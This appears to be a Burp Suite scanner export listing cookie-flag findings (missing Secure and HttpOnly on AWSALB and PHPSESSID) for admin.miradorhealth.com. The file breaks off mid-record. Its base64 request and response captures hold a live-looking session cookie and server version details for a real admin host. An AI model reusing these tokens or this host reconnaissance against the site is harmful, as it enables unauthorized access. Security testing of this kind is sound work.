<?xml version="1.0"?>
<!DOCTYPE issues [
<!ELEMENT issues (issue*)>
<!ATTLIST issues burpVersion CDATA "">
<!ATTLIST issues exportTime CDATA "">
<!ELEMENT issue (serialNumber, type, name, host, path, location, severity, confidence, issueBackground?, remediationBackground?, references?, vulnerabilityClassifications?, issueDetail?, issueDetailItems?, remediationDetail?, requestresponse*, collaboratorEvent*, infiltratorEvent*, staticAnalysis*, dynamicAnalysis*, prototypePollution*)>
<!ELEMENT serialNumber (#PCDATA)>
<!ELEMENT type (#PCDATA)>
<!ELEMENT name (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT path (#PCDATA)>
<!ELEMENT location (#PCDATA)>
<!ELEMENT severity (#PCDATA)>
<!ELEMENT confidence (#PCDATA)>
<!ELEMENT issueBackground (#PCDATA)>
<!ELEMENT remediationBackground (#PCDATA)>
<!ELEMENT references (#PCDATA)>
<!ELEMENT vulnerabilityClassifications (#PCDATA)>
<!ELEMENT issueDetail (#PCDATA)>
<!ELEMENT issueDetailItems (issueDetailItem*)>
<!ELEMENT issueDetailItem (#PCDATA)>
<!ELEMENT remediationDetail (#PCDATA)>
<!ELEMENT requestresponse (request?, response?, responseRedirected?)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request method CDATA "">
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT responseRedirected (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT message (#PCDATA)>
<!ELEMENT conversation (#PCDATA)>
<!ELEMENT recipient (#PCDATA)>
<!ELEMENT recipients (recipient*)>
<!ELEMENT smtp (sender, recipients, message, conversation)>
<!ELEMENT collaboratorEvent (interactionType, originIp, time, lookupType?, lookupHost?, requestresponse?, smtp?)>
<!ELEMENT interactionType (#PCDATA)>
<!ELEMENT originIp (#PCDATA)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT lookupType (#PCDATA)>
<!ELEMENT lookupHost (#PCDATA)>
<!ELEMENT infiltratorEvent (parameterName, platform, signature, stackTrace?, parameterValue?, collaboratorEvent)>
<!ELEMENT parameterName (#PCDATA)>
<!ELEMENT platform (#PCDATA)>
<!ELEMENT signature (#PCDATA)>
<!ELEMENT stackTrace (#PCDATA)>
<!ELEMENT parameterValue (#PCDATA)>
<!ELEMENT dynamicAnalysis (source, sink, sourceStackTrace, sinkStackTrace, eventListenerStackTrace, sourceValue, sinkValue, eventHandlerData, eventHandlerDataType, eventHandlerManipulatedData, poc, origin, isOriginChecked, sourceElementId, sourceElementName, eventFiredEventName, eventFiredElementId, eventFiredElementName, eventFiredOuterHtml)>
<!ELEMENT prototypePollution (poc, pollutionTechnique, pollutionType)>
<!ELEMENT staticAnalysis (source, sink, codeSnippets)>
<!ELEMENT source (#PCDATA)>
<!ELEMENT sink (#PCDATA)>
<!ELEMENT sourceStackTrace (#PCDATA)>
<!ELEMENT sinkStackTrace (#PCDATA)>
<!ELEMENT eventListenerStackTrace (#PCDATA)>
<!ELEMENT sourceValue (#PCDATA)>
<!ELEMENT sinkValue (#PCDATA)>
<!ELEMENT eventHandlerData (#PCDATA)>
<!ELEMENT eventHandlerDataType (#PCDATA)>
<!ELEMENT sourceElementId (#PCDATA)>
<!ELEMENT sourceElementName (#PCDATA)>
<!ELEMENT eventFiredEventName (#PCDATA)>
<!ELEMENT eventFiredElementId (#PCDATA)>
<!ELEMENT eventFiredElementName (#PCDATA)>
<!ELEMENT eventFiredOuterHtml (#PCDATA)>
<!ELEMENT eventHandlerManipulatedData (#PCDATA)>
<!ELEMENT poc (#PCDATA)>
<!ELEMENT origin (#PCDATA)>
<!ELEMENT isOriginChecked (#PCDATA)>
<!ELEMENT codeSnippets (codeSnippet*)>
<!ELEMENT codeSnippet (#PCDATA)>
<!ELEMENT pollutionTechnique (#PCDATA)>
<!ELEMENT pollutionType (#PCDATA)>
]>
<issues burpVersion="2024.10.3" exportTime="Sat Dec 14 14:47:14 CST 2024">
  <issue>
    <serialNumber>8747866625741739008</serialNumber>
    <type>5243392</type>
    <name><![CDATA[TLS cookie without secure flag set]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If the secure flag is set on a cookie, then browsers will not submit the cookie in any requests that use an unencrypted HTTP connection, thereby preventing the cookie from being trivially intercepted by an attacker monitoring network traffic. If the secure flag is not set, then the cookie will be transmitted in clear-text if the user visits any HTTP URLs within the cookie's scope. An attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site. Even if the domain that issued the cookie does not host any content that is accessed over HTTP, an attacker may be able to use links of the form http://example.com:443/ to perform the same attack.</p>
<p>To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The secure flag should be set on all cookies that are used for transmitting sensitive data when accessing content over HTTPS. If cookies are used to transmit session tokens, then areas of the application that are accessed over HTTPS should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/614.html">CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following cookie was issued by the application and does not have the secure flag set:<ul><li>AWSALB</li></ul>The cookie does not appear to contain a session token, which may reduce the risk associated with this issue. You should review the contents of the cookie to determine its function.This issue was found in multiple locations under the reported path.]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[Other: AWSALB]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9sb2dpbiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpDb29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBBV1NBTEJDT1JTPVlYcjUvS1prcDFMRVVFS3BWUWEzaDRhTVgzVzd2bXU5RFhkYU9LZS9aL1JlZm14KzRld2M2QWZrc1NxL3dkeWZVdXU3QTZmRGl2WWJhbjQyWkh5MlFZYTU3d2tsbFRKNWN2NmpTUzF3WDY0c3dHNGFRU3liOGJJcXlHWkI7IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0cw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINClByaW9yaXR5OiB1PTAsIGkNCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9MCwgaQ0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDMwMiBGb3VuZA0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzoyOTowNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMA0KTG9jYXRpb246IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNldC1Db29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6Mjk6MDYgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9WVhyNS9LWmtwMUxFVUVLcFZRYTNoNGFNWDNXN3ZtdTlEWGRhT0tlL1ovUmVmbXgrNGV3YzZBZmtzU3Evd2R5ZlV1dTdBNmZEaXZZYmFuNDJaSHkyUVlhNTd3a2xsVEo1Y3Y2alNTMXdYNjRzd0c0YVFTeWI4YklxeUdaQjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjI5OjA2IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpTZXQtQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHBhdGg9Lw0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IEFXU0FMQj11d1pjYzE4SlF0WEt0Y2YzNWtGc1NHTzdtMnh3YVo0cm00SWs2UmJUSGRWUkJVdVNPWFNCVzV1RnVjeDJ0MkhwTGRjZWg3SGJ0YzRLSGZkSTlPQmlRNVdaUDVZTk9NYkhmdHZXY1dBbFZuTFh0OVdqMFJxUFd5dm0zdGFFOyBBV1NBTEJDT1JTPXV3WmNjMThKUXRYS3RjZjM1a0ZzU0dPN20yeHdhWjRybTRJazZSYlRIZFZSQlV1U09YU0JXNXVGdWN4MnQySHBMZGNlaDdIYnRjNEtIZmRJOU9CaVE1V1pQNVlOT01iSGZ0dldjV0FsVm5MWHQ5V2owUnFQV3l2bTN0YUUNClNlYy1DaC1VYS1QbGF0Zm9ybTogIkxpbnV4Ig0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KU2VjLUNoLVVhOiAiQ2hyb21pdW0iO3Y9IjEzMSIsICJOb3RfQSBCcmFuZCI7dj0iMjQiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpTZWMtQ2gtVWEtTW9iaWxlOiA/MA0KQWNjZXB0OiB0ZXh0L2NzcywqLyo7cT0wLjENClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLU1vZGU6IG5vLWNvcnMNClNlYy1GZXRjaC1EZXN0OiBzdHlsZQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9MA0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8861503472843715584</serialNumber>
    <type>5243392</type>
    <name><![CDATA[TLS cookie without secure flag set]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Medium</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If the secure flag is set on a cookie, then browsers will not submit the cookie in any requests that use an unencrypted HTTP connection, thereby preventing the cookie from being trivially intercepted by an attacker monitoring network traffic. If the secure flag is not set, then the cookie will be transmitted in clear-text if the user visits any HTTP URLs within the cookie's scope. An attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site. Even if the domain that issued the cookie does not host any content that is accessed over HTTP, an attacker may be able to use links of the form http://example.com:443/ to perform the same attack.</p>
<p>To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The secure flag should be set on all cookies that are used for transmitting sensitive data when accessing content over HTTPS. If cookies are used to transmit session tokens, then areas of the application that are accessed over HTTPS should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/614.html">CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following cookie was issued by the application and does not have the secure flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[Session: PHPSESSID]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9MCwgaQ0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDMwMiBGb3VuZA0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzoyOTowNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMA0KTG9jYXRpb246IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNldC1Db29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6Mjk6MDYgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9WVhyNS9LWmtwMUxFVUVLcFZRYTNoNGFNWDNXN3ZtdTlEWGRhT0tlL1ovUmVmbXgrNGV3YzZBZmtzU3Evd2R5ZlV1dTdBNmZEaXZZYmFuNDJaSHkyUVlhNTd3a2xsVEo1Y3Y2alNTMXdYNjRzd0c0YVFTeWI4YklxeUdaQjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjI5OjA2IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpTZXQtQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHBhdGg9Lw0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>231276968194991104</serialNumber>
    <type>5244416</type>
    <name><![CDATA[Cookie without HttpOnly flag set]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>
<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">Web Security Academy: Exploiting XSS vulnerabilities</a></li><li><a href="https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly">HttpOnly effectiveness</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li><li><a href="https://capec.mitre.org/data/definitions/31.html">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li>AWSALB</li></ul>The cookie does not appear to contain a session token, which may reduce the risk associated with this issue. You should review the contents of the cookie to determine its function.This issue was found in multiple locations under the reported path.]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[Other: AWSALB]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9sb2dpbiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpDb29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBBV1NBTEJDT1JTPVlYcjUvS1prcDFMRVVFS3BWUWEzaDRhTVgzVzd2bXU5RFhkYU9LZS9aL1JlZm14KzRld2M2QWZrc1NxL3dkeWZVdXU3QTZmRGl2WWJhbjQyWkh5MlFZYTU3d2tsbFRKNWN2NmpTUzF3WDY0c3dHNGFRU3liOGJJcXlHWkI7IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0cw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINClByaW9yaXR5OiB1PTAsIGkNCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpTZWMtQ2gtVWEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43DQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtVXNlcjogPzENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9MCwgaQ0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDMwMiBGb3VuZA0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzoyOTowNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMA0KTG9jYXRpb246IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNldC1Db29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6Mjk6MDYgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9WVhyNS9LWmtwMUxFVUVLcFZRYTNoNGFNWDNXN3ZtdTlEWGRhT0tlL1ovUmVmbXgrNGV3YzZBZmtzU3Evd2R5ZlV1dTdBNmZEaXZZYmFuNDJaSHkyUVlhNTd3a2xsVEo1Y3Y2alNTMXdYNjRzd0c0YVFTeWI4YklxeUdaQjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjI5OjA2IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpTZXQtQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHBhdGg9Lw0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
